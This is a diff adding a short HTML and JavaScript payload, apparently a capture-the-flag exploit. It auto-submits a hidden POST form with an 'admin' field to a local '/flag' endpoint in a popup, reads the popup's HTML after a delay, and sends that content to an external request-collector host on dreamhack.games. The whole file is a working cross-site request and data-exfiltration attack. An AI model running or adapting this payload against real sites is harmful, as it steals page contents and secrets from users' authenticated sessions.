@@ -1,0 +1,17 @@
+<form name ="a" target="a" action="http://localhost:8000/flag" method="POST">
+    <input name="admin" value="zzlol" />
+</form>
+
+<script>
+    	var url = "http://localhost:8000/flag";
+        popup = window.open("", "a", {});
+        
+        var myForm = document.a;
+        myForm.submit();
+
+        setTimeout(function() {
+            html = popup.document.documentElement.outerHTML;
+            console.log(html);
+            window.open("https://ohhloxh.request.dreamhack.games/" + html, "asdf", {});
+        }, 1000);
+</script>
